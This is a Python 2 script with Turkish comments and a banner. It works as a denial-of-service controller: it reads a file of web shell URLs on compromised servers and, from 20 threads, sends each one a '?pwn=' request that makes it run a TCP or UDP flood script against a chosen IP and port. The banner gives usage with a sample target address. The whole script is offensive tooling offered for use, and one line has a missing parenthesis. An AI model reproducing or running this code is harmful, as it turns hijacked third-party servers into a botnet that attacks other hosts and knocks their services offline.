#coding:utf-8
import os
import Queue
import sys
import ssl
import threading
import requests
import threading

os.system('cls' if os.name == 'nt' else 'clear')
class renkler:
    HEADER = '\033[95m'
    mavi = '\033[94m'
    yesil = '\033[92m'
    sari = '\033[93m'
    kirmizi = '\033[91m'
    beyaz = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
print renkler.yesil + """
############################################################################
#                        Cüneyt Tanrısever                                  #
#                     shell ile tcp udp atak                               #
# TCP icin = ip adress port TCP atak sayisi max 443                        #
# Tcp atak icin = cuneyt.py 192.47.3.1 80 TCP  443                         #
# UDP icin = ip adress port UDP atak sayisi max 443                        #
# Tcp atak icin = cuneyt.py 192.47.3.1 80 UDP  443                         #
############################################################################"""+renkler.beyaz


site=Queue.Queue()
ip=sys.argv[1]
port=sys.argv[2]
atak=sys.argv[3]
sayi=sys.argv[4]
a=0
print ip,port,atak,sayi
dex=raw_input("shell listesini adi (sheller.txt) veya \ndizin ile (/dizin/sheller.txt) giriniz. = ")
lock = threading.Lock ()
cuneyt=open(dex,"r").readlines()
dex=len(cuneyt)
print dex," adet shell adresiniz vardir."

def urlek(ip,port,atak,sayi):
    while True:
            try:
            	for dr in cuneyt:
                        d=dr.replace("\n","")
                        global lock
                        lock.acquire()
                        url=d
                        urlekk="?pwn=python%20dexatak.py"+"%20"+ip+"%20"+port+"%20"+atak+"%20"+sayi
                        urltam=url+urlekk
                        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
                        rq=requests.session()
                        rq.headers.update(headers)
                        res=rq.get(urltam)
                        _= res.content
                        res.close()
                        global a
                        a +=1
                        print a,"-) ",url
                        lock.release ()
                
               
            except requests.exceptions.Timeout: 
                print "baglanti 10 sn icinde gelmedi ve url atlandi"

for i in range(20):
    t = threading.Thread(target=urlek, args=(ip,port,atak,sayi,)
    t.start()


    

